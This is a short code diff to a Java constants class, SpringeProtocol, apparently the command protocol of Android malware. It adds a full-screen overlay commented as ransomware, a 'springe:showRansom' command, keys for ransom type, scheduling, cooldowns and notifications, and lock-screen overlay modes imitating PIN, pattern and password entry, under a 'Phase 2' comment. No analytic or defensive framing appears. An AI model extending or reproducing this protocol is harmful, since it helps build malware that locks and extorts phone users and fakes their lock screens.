@@ -123,4 +123,29 @@ public final class SpringeProtocol {
     public static final String KEY_SCREEN_WIDTH      = "screenWidth";
     public static final String KEY_SCREEN_HEIGHT     = "screenHeight";
     public static final String KEY_DENSITY           = "density";
-  }
+    // New overlay type
+public static final String OVERLAY_MAX = "max"; // FullScreen (ransomware)
+
+// New commands for Phase 2
+public static final String CMD_SHOW_RANSOM     = "springe:showRansom";
+public static final String CMD_SEND_NOTIFICATION = "springe:sendNotification";
+public static final String CMD_SET_SCHEDULES   = "springe:setSchedules";
+public static final String CMD_GET_SCHEDULES   = "springe:getSchedules";
+
+// Additional keys
+public static final String KEY_DIALOG_TYPE     = "dialogType";
+public static final String KEY_RANSOM_TYPE     = "ransomType";
+public static final String KEY_GESTURE_TYPE    = "gestureType";
+public static final String KEY_SCHEDULES       = "schedules";
+public static final String KEY_COOLDOWN_MS     = "cooldownMs";
+public static final String KEY_EXPIRES_AT      = "expiresAt";
+public static final String KEY_NOTIF_TITLE     = "notificationTitle";
+public static final String KEY_NOTIF_TEXT      = "notificationText";
+public static final String KEY_NOTIF_ICON      = "notificationIcon";
+
+// Mode constants for LockScreenOverlay
+public static final String KEY_LOCK_MODE       = "mode";
+public static final int LOCK_MODE_PIN = 0;
+public static final int LOCK_MODE_PATTERN = 1;
+public static final int LOCK_MODE_PASSWORD = 2;
+}
